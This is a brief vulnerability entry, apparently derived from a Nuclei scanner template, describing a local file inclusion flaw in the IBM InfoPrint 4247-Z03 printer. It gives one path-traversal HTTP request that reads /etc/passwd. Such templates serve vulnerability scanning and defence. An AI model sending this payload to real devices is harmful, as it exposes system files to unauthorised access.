# Vulnerability: IBM InfoPrint 4247-Z03 Impact Matrix Printer - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`ibm-infoprint-lfi.yaml`)

## Description
IBM InfoPrint 4247-Z03 Impact Matrix Printer is subject to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/./../../../../../../../../../../etc/passwd
```

